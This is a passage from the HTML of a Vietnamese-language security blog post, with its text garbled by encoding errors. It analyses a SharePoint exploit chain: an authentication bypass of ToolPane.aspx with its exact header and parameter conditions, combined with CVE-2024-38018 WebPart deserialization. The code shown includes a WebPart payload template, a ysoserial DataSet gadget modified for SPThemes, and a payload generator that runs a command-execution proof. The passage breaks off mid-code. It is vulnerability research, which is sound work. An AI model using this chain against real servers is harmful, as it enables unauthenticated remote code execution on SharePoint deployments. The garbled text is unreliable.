&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BywB9qkSWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p theo, chÆ°Æ¡ng trÃ¬nh sáº½ xá»­ lÃ½ Ä‘áº¿n hÃ m SelectedAspWebPart, nÆ¡i mÃ  ná»™i dung WebPart truyá»n trong body sáº½ Ä‘Æ°á»£c xá»­ lÃ½ thÃ´ng qua 2 giÃ¡ trá»‹ táº¡i body lÃ  MSOTlPn_Uri vÃ  MSOTlPn_DWP:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyHLq51Hbx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MSOTlPn_Uri chá»©a Ä‘Æ°á»ng dáº«n frontPage, cÃ²n MSOTlPn_DWP chá»©a ná»™i dung thÃ´ng tin vá» Web Part Ä‘á»ƒ tiáº¿n hÃ nh import, logic import sáº½ náº±m táº¡i hÃ m GetPartPreviewAndPropertiesFromMarkup. Äá»ƒ vÃ o Ä‘Æ°á»£c cÃ¢u lá»‡nh if thÃ¬ cÃ²n Ä‘iá»u kiá»‡n DisplayMode = EditDisplayMode, hay &lt;code&gt;?DisplayMode=Edit&lt;/code&gt;.&lt;br&gt;
Nháº£y vÃ o GetPartPreviewAndPropertiesFromMarkup - hÃ m xá»­ lÃ½ trá»±c tiáº¿p import webpart lÃ  GetMarkupProperties, cÅ©ng lÃ  sink vuln deserialize báº±ng webpart. NhÆ°ng trÆ°á»›c khi Ä‘áº¿n Ä‘Æ°á»£c hÃ m Ä‘Ã³ cáº§n pháº£i thá»a mÃ£n táº¥t cáº£ nhá»¯ng dÃ²ng lá»‡nh trÃªn, trong Ä‘Ã³ cÃ³ CreateAndInitializeDocumentDesigner, vá»›i input pageUri chÃ­nh lÃ  param MSOTlPn_Uri Ä‘Ã£ truyá»n vÃ o trÆ°á»›c Ä‘Ã³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B111j5yrWe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CreateAndInitializeDocumentDesigner sáº½ gá»i Ä‘áº¿n method Create cá»§a class ServerWebFileFromFileSystem vá»›i callstack:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1HeoqkS-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i method nÃ y, chÆ°Æ¡ng trÃ¬nh tiáº¿n hÃ nh kiá»ƒm tra url truyá»n vÃ o cÃ³ chá»©a &lt;code&gt;_controltemplates/&lt;/code&gt; vÃ  cÃ³ pháº£i file .ascx khÃ´ng, náº¿u tá»“n táº¡i thÃ¬ tráº£ vá» object ServerWebFile dá»±a trÃªn file tháº­t, khÃ´ng sáº½ tráº£ vá» null:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJUWoc1B-l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Nháº±m thá»a mÃ£n dÃ²ng lá»‡nh trÃªn, cáº§n tÃ¬m file ascx tÃ¹y Ã½ náº±m trong folder &lt;code&gt;_controltemplates/&lt;/code&gt;, mÃ¬nh lá»±a chá»n &lt;code&gt;_controltemplates/15/ActionBar.ascx&lt;/code&gt; Ä‘á»ƒ poc vÃ¬ nÃ³ á»Ÿ ngay Ä‘áº§u.&lt;br&gt;
CÅ©ng cÃ³ hÆ¡i nhiá»u Ä‘iá»u kiá»‡n rá»“i, tá»•ng há»£p láº¡i Ä‘á»ƒ bypass authen vÃ o Ä‘Æ°á»£c endpoint ToolPane.aspx, mÃ¬nh cáº§n:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Referer header: &lt;code&gt;/_layouts/15/SignOut.aspx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;URL param: &lt;code&gt;DisplayMode=Edit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;URL pháº£i káº¿t thÃºc báº±ng /ToolPane.aspx: thÃªm má»™t url param tÃ¹y Ã½ vá»›i giÃ¡ trá»‹ lÃ  /ToolPane.aspx&lt;/li&gt;
&lt;li&gt;MSOTlPn_Uri: &lt;code&gt;http://sp-server/my/_controltemplates/15/ActionBar.ascx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="cve-2024-38018-webpart-properties-insecure-deserialize"&gt;[CVE-2024-38018] WebPart Properties Insecure Deserialize
&lt;/h3&gt;&lt;p&gt;KhÃºc nÃ y sáº½ hÆ¡i cáº¥n vÃ¬ táº¡i sao mÃ¬nh láº¡i khÃ´ng dÃ¹ng CVE-2025-49704 mÃ  láº¡i lÃ  má»™t CVE khÃ¡c. Khi tiáº¿n hÃ nh thá»­ poc Ä‘á»ƒ test thÃ¬ mÃ¬nh confirm Ä‘Ã£ bypass auth nhÆ°ng láº¡i khÃ´ng thá»ƒ trigger deser, nÃ³ sáº½ vÄƒng ra lá»—i file Web Part not valid, mÃ¬nh Ä‘oÃ¡n lÃ  do cáº¥u trÃºc Webpart cá»§a phiÃªn báº£n 2013 vÃ  2019 cÃ³ sá»± khÃ¡c biá»‡t nÃªn khi import vÃ o bá»‹ lá»—i. (Váº­y mÃ  microsoft báº£o ráº±ng exploit Ä‘Æ°á»£c á»Ÿ má»i phiÃªn báº£n Sharepoint 2013)&lt;br&gt;
MÃ y mÃ² cÃ i Service Pack vÃ  cÃ i tiáº¿p báº£n patch cho Sharepoint nhÆ°ng cÅ©ng khÃ´ng giÃ²n. MÃ¬nh cÃ³ Ä‘i há»i vÃ  biáº¿t Ä‘Æ°á»£c ngÆ°á»i anh em xÃ£ há»™i cÅ©ng gáº·p váº¥n Ä‘á» tÆ°Æ¡ng tá»±, vÃ  ngÆ°á»i anh em Ä‘Ã³ Ä‘Ã£ cho mÃ¬nh má»™t solution khÃ¡c: sá»­ dá»¥ng CVE-2024-38018 - má»™t CVE khÃ¡c attack vÃ o Insecure Deserialize property cá»§a webpart. PoC cá»§a lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p vÃ  phÃ¢n tÃ­ch khÃ¡ chi tiáº¿t táº¡i &lt;a class="link" href="https://blog.viettelcybersecurity.com/sharepoint_properties_deser/" target="_blank" rel="noopener"
&gt;https://blog.viettelcybersecurity.com/sharepoint_properties_deser/&lt;/a&gt; nÃªn mÃ¬nh cÅ©ng khÃ¡ lÃ  Äƒn theo thÃ´i :)))&lt;br&gt;
Tiáº¿p tá»¥c phÃ¢n tÃ­ch nÃ o, mÃ¬nh sáº½ láº¥y pháº§n webpart cá»§a bÃ i phÃ¢n tÃ­ch trÃªn:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%@ Register Tagprefix=&amp;#34;WebPartPages&amp;#34; Namespace=&amp;#34;Microsoft.SharePoint.WebPartPages&amp;#34; Assembly=&amp;#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&amp;#34; %&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;WebPartPages:XmlWebPart ID=&amp;#34;SPWebPartManager&amp;#34; runat=&amp;#34;Server&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;WebPart xmlns=&amp;#34;http://schemas.microsoft.com/WebPart/v2&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;AttachedPropertiesShared&amp;gt;{SerializeData}&amp;lt;/AttachedPropertiesShared&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/WebPart&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/WebPartPages:XmlWebPart&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;CVE-2024-38018 Ä‘Ã£ khai thÃ¡c lá»— há»•ng Insecure Deserialize dá»¯ liá»‡u DataSet thÃ´ng qua cÆ¡ cháº¿ parse webpart control Ä‘á»ƒ thá»±c thi code tá»« xa, báº¯t Ä‘áº§u tá»« method &lt;code&gt;WebPart.AddParsedSubObject()&lt;/code&gt;. Method nÃ y sáº½ luÃ´n Ä‘Æ°á»£c gá»i khi truyá»n vÃ o má»™t webpart control, vá»›i má»¥c Ä‘Ã­ch láº¥y toÃ n bá»™ chuá»—i truyá»n vÃ o Ä‘Ã£ loáº¡i bá» pháº§n register vÃ  reference assembly thÃ´ng qua class LiteralControl Ä‘á»ƒ Ä‘Æ°a vÃ o method ParseXml:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1hFR5JrZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ParseXml thá»±c hiá»‡n deserialize dá»¯ liá»‡u truyá»n vÃ o thÃ´ng qua XmlSerializer. Deserialize, tráº£ vá» object webPart vÃ  tiáº¿p tá»¥c gá»i Ä‘áº¿n DoPostDeserializationTasks Ä‘á»ƒ thá»±c hiá»‡n má»™t sá»‘ thao tÃ¡c sau láº§n deserialize Ä‘áº§u tiÃªn:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1pq0ckBbg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
DoPostDeserializationTasks sáº½ tiáº¿p tá»¥c call Ä‘áº¿n GetAttachedProperties, táº¡i Ä‘Ã¢y thuá»™c tÃ­nh &lt;code&gt;_serializedAttachedPropertiesShared&lt;/code&gt; Ä‘Æ°á»£c deserialize vá»›i binder SPSerializationBinder:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1aj0cyBZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Trong khi Ä‘Ã³, &lt;code&gt;_serializedAttachedPropertiesShared&lt;/code&gt; cÃ³ thá»ƒ Ä‘Æ°á»£c set giÃ¡ trá»‹ báº±ng element tag AttachedPropertiesShared:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByQT09yrZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Binder SPSerializationBinder cho phÃ©p thá»±c hiá»‡n deserialize vá»›i báº¥t kÃ¬ class nÃ o thuá»™c SafeControls - lÃ  má»™t thuá»™c tÃ­nh Ä‘Æ°á»£c khai bÃ¡o trong web.config cá»§a Sharepoint site, chá»©a danh sÃ¡ch cÃ¡c assembly, namespace vÃ  class Ä‘Æ°á»£c phÃ©p gá»i Ä‘áº¿n vÃ  sá»­ dá»¥ng trong Sharepoint:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1bCRc1rZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Trong Ä‘á»‘ng class nÃ y, vÃ´ tÃ¬nh lÃ m sao cÃ³ chá»©a SPThemes káº¿ thá»«a class DataSet, cÅ©ng nhÆ° sá»­ dá»¥ng constructor cá»§a Dataset:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1UlJo1Sbx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ³ DataSet lÃ  ngon luÃ´n, mÃ¬nh Ä‘á»›p ngay gadget chain dataset Ä‘Æ°á»£c sá»­ dá»¥ng trong ysoserial, chain nÃ y sáº½ call Ä‘áº¿n method deserialize DataSet.Tables_0 báº±ng BinaryFormatter mÃ  khÃ´ng kiá»ƒm tra binder. á» Ä‘Ã¢y sá»­a Ä‘oáº¡n code DataSetGenerator thÃ nh type SPThemes lÃ  oke:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Serializable&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="n"&gt;DataSetMarshalMod&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ISerializable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;_fakeTable&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;void&lt;/span&gt; &lt;span class="n"&gt;GetObjectData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SerializationInfo&lt;/span&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;StreamingContext&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SPThemes&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.RemotingFormat&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SerializationFormat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Binary&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.DataSetName&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.Namespace&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.Prefix&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.CaseSensitive&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.LocaleLCID&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1033&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.EnforceConstraints&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.ExtendedProperties&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.Tables.Count&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;DataSet.Tables_0&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_fakeTable&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;void&lt;/span&gt; &lt;span class="n"&gt;SetFakeTable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;bfPayload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_fakeTable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bfPayload&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;DataSetMarshalMod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;bfPayload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SetFakeTable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bfPayload&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Äoáº¡n code xá»­ lÃ½ thÃ¬ dÃ¹ng reflection Ä‘á»ƒ call Ä‘Æ°á»£c SPObjectStateFormatter.Serialize(), lÆ°u Ã½ lÃ  cáº§n sá»­ dá»¥ng dll cá»§a Sharepoint:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;void&lt;/span&gt; &lt;span class="n"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;spformatter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Activator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateInstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Microsoft.SharePoint&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Unwrap&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;MethodInfo&lt;/span&gt; &lt;span class="n"&gt;SPSerializer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;spformatter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Serialize&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;psi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ProcessStartInfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;ysoserial.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-g TypeConfuseDelegate -f BinaryFormatter -o base64 -c &amp;#34;&amp;#34;echo SUCCESS &amp;gt; C:\Users\Public\pwn.txt&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
